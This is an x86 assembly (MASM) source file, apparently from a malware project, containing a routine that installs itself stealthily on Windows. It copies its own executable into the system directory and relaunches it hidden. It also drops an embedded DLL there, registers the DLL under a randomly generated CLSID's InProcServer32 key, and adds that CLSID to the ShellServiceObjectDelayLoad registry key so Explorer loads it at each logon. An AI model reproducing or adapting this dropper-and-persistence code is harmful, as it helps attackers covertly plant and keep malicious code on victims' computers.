include Autorun.inc
.data
OneStr db "CLSID\",0
TwoStr db "\InProcServer32",0
ThreeStr db "Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad",0
myGUID CLSID <>

.data?
par1 	dd ?
par2 	dd ?
DStr0 	db 6670 dup (?)
DStr2 	db 6670 dup (?)

.code
RunDLL proc
        LOCAL   hkHandle: DWORD
	LOCAL   hFile: DWORD
        LOCAL   bWritten: DWORD
        invoke  GetSystemDirectory, offset lpBuf1, MAX_PATH+1
	invoke GetModuleFileName, NULL, offset lpBuf2, MAX_PATH+1

	invoke  lstrcat, offset lpBuf1, addr exename

  	invoke  lstrcmp, offset lpBuf1, offset lpBuf2
        test    eax, eax
        jz      @ret ; running from windows directory, do nothing

        invoke  CopyFile, offset lpBuf2, offset lpBuf1, 0
        test    eax, eax
        jz      @exit ; file cannot be copied: it's running already

@@:
        invoke  ShellExecute, 0, offset szTextOpen, offset lpBuf1, 0, 0, SW_HIDE
@exit:
        invoke  ExitProcess, 0
@ret:
        invoke  GetSystemDirectory, offset lpBuf1, MAX_PATH+1

invoke lstrcat,addr lpBuf1, addr dll

 invoke  CreateFile, offset lpBuf1, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @wend
        invoke  WriteFile, hFile, offset Autorun, AutorunLen, addr bWritten, NULL
        invoke  CloseHandle, hFile
@wend:

invoke MyClearStr, offset DStr0, 6666
invoke MyClearStr, offset DStr2, 6666
invoke CoCreateGuid, addr myGUID
.IF eax == 0 
mov par1, offset DStr2
invoke StringFromCLSID, addr myGUID, addr par1
.IF eax == 0 
mov par2,0
push edi
mov edi, par1
.WHILE TRUE
invoke lstrcat, addr DStr0, edi
add edi,2
inc par2
.BREAK .IF par2 == 38
.ENDW
pop edi
.ENDIF
.ENDIF
invoke MyClearStr, offset DStr2, 6670
; открываем реестр
invoke RegCreateKey, HKEY_LOCAL_MACHINE, addr ThreeStr, addr hKey
mov par1, 1000
mov par2, REG_SZ
; читаем параметр автозапуска
invoke RegQueryValueEx, hKey, addr szAutoName, NULL, addr par2, addr DStr2, addr par1
invoke lstrlen, addr DStr2
.IF eax < 38
invoke lstrcpy, addr DStr2, addr OneStr
invoke lstrcat, addr DStr2, addr DStr0
invoke lstrcat, addr DStr2, addr TwoStr
invoke RegCreateKey, HKEY_CLASSES_ROOT, addr DStr2, addr hKey
.IF eax == 0
invoke RegSetValueEx, hKey, NULL, NULL, REG_SZ, addr dll, sizeof dll
invoke RegCloseKey, hKey
.ENDIF
invoke RegCreateKey, HKEY_LOCAL_MACHINE, addr ThreeStr, addr hKey
.IF eax == 0
invoke RegSetValueEx, hKey, addr szAutoName, NULL, REG_SZ, addr DStr0, 38
invoke RegCloseKey, hKey
.ENDIF                                  
.ENDIF
ret
RunDLL endp

